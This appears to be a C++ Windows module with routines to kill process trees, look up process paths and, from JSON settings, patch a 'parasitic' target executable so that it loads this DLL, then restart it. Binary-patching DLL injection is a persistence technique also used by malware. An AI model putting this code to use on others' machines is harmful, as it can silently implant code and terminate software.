#include <windows.h>

#include <tchar.h>
#include <Psapi.h>
#include <tlhelp32.h>

#include "JsonControl\json.h"
#include "SetDll\SetDll_Inferface.h"
#include "CommonControl\Commonfun.h"

#pragma comment(lib,"Psapi.lib")

#pragma  comment(lib,DIRECTORY_LIB_INTERNAL "SetDll.lib")
#pragma  comment(lib,DIRECTORY_LIB_INTERNAL "JsonControl.lib")
#pragma  comment(lib,DIRECTORY_LIB_INTERNAL "CommonControl.lib")

namespace Common {
	bool KillProcessByID(DWORD dwProcessID) {
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID);

		if (NULL == hProcess) {
			return false;
		}

		BOOL bIsKill = TerminateProcess(hProcess, 0);

		CloseHandle(hProcess);

		return (TRUE == bIsKill);
	}

	void KillProcessTree(DWORD dwProcessID)
	{
		HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, dwProcessID);

		if (hProcessSnap == INVALID_HANDLE_VALUE) {
			return;
		}

		PROCESSENTRY32 info;
		info.dwSize = sizeof(PROCESSENTRY32);

		BOOL bMore = Process32First(hProcessSnap, &info);

		while (bMore)
		{
			if (dwProcessID == info.th32ParentProcessID) {
				KillProcessTree(info.th32ProcessID);
			}

			bMore = Process32Next(hProcessSnap, &info);
		}

		KillProcessByID(dwProcessID);
	}

	bool DosDevicePath2LogicalPath(LPCTSTR lpszDosPath, LPTSTR pszOutPath)
	{
		// Translate path with device name to drive letters.
		TCHAR szTemp[MAX_PATH];
		szTemp[0] = '\0';

		if (lpszDosPath == NULL || !GetLogicalDriveStrings(_countof(szTemp) - 1, szTemp)) {
			return false;
		}

		TCHAR szName[MAX_PATH];
		TCHAR szDrive[3] = TEXT(" :");
		BOOL bFound = FALSE;
		TCHAR* p = szTemp;

		do {
			// Copy the drive letter to the template string
			*szDrive = *p;

			// Look up each device name
			if (QueryDosDevice(szDrive, szName, _countof(szName))) {
				UINT uNameLen = (UINT)_tcslen(szName);

				if (uNameLen < MAX_PATH)
				{
					bFound = _tcsnicmp(lpszDosPath, szName, uNameLen) == 0;

					if (bFound) {
						// Reconstruct pszFilename using szTemp
						// Replace device path with DOS path
						TCHAR szTempFile[MAX_PATH];
						_stprintf_s(szTempFile, TEXT("%s%s"), szDrive, lpszDosPath + uNameLen);
						_tcscpy(pszOutPath, szTempFile);
					}
				}
			}

			// Go to the next NULL character.
			while (*p++);
		} while (!bFound && *p); // end of string

		return true;
	}

	bool GetProcessPath(__in DWORD dwProcessID, __out LPTSTR pszProcessPath, size_t sizeMaxLen) {

		if (0 == dwProcessID) {
			return false;
		}

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);

		if (0 == GetModuleFileNameEx(hProcess, NULL, pszProcessPath, sizeMaxLen)) {
			if (0 == GetProcessImageFileName(hProcess, pszProcessPath, sizeMaxLen)) {
				return false;
			}

			return DosDevicePath2LogicalPath(pszProcessPath, pszProcessPath);
		}

		return true;
	}

	BOOL WINAPI Fundadores_(const wchar_t * pwszParameters) {
		Json::Value jsonVaule;
		Json::Reader jsonReader;

		char * jsonParam = (char *)malloc(wcslen(pwszParameters) * 2);

		Common::WSTR2STR(pwszParameters, jsonParam);

		if (false == jsonReader.parse(jsonParam, jsonVaule) || jsonVaule.isArray()) {
			free(jsonParam);
			return FALSE;
		}

		free(jsonParam);

		TCHAR szStartProcessPath[MAX_PATH + 1] = { 0 };

		if (jsonVaule["restart"].isString()) {
			tchar szProcessName[MAX_PATH + 1] = { 0 };

			Common::STR2TSTR(jsonVaule["restart"].asCString(), szProcessName);
			GetProcessPath(Common::GetProcessIDFromProcessName(szProcessName), szStartProcessPath, MAX_PATH);
		}


		if (jsonVaule["kill"].asBool()) {
			DWORD dwProcessID = 0;
			tchar szProcessName[MAX_PATH + 1] = { 0 };

			for (int i = 0; i < jsonVaule["process"].size(); i++) {
				while (Common::STR2TSTR(jsonVaule["process"][i].asCString(), szProcessName) && 0 != (dwProcessID = Common::GetProcessIDFromProcessName(szProcessName))) { // 7170
					KillProcessTree(dwProcessID);
				}
			}
		}

		if (jsonVaule["install"].asBool()) {
			char szCurrentModuleName[MAX_PATH + 1] = { 0 };

			size_t sizeModuleBufSize = strlen(jsonVaule["inject"]["parasitic"].asCString()) * 2;
			char * pszInjectModuleName = (char *)malloc(sizeModuleBufSize);

			::GetModuleFileName(Common::GetModuleHandleByAddr(Fundadores_), szCurrentModuleName, MAX_PATH);
			::ExpandEnvironmentStrings(jsonVaule["inject"]["parasitic"].asCString(), pszInjectModuleName, sizeModuleBufSize);

			if (FALSE == AddDllToFile(pszInjectModuleName, szCurrentModuleName, jsonVaule["inject"]["section"].asCString(), jsonVaule["inject"]["remove"].asBool())) {
				return FALSE;
			}

			free(pszInjectModuleName);
		}

		if ('\0' != szStartProcessPath[0]) {
			STARTUPINFO siStratupInfo = { 0 };
			PROCESS_INFORMATION piProcessInformation = { 0 };

			siStratupInfo.cb = sizeof(STARTUPINFO);
			if (FALSE == ::CreateProcess(NULL, szStartProcessPath, NULL, NULL, FALSE, 0, NULL, NULL, &siStratupInfo, &piProcessInformation)) {
				return FALSE;
			}

			CloseHandle(piProcessInformation.hThread);
			CloseHandle(piProcessInformation.hProcess);
		}

		return TRUE;
	}
}
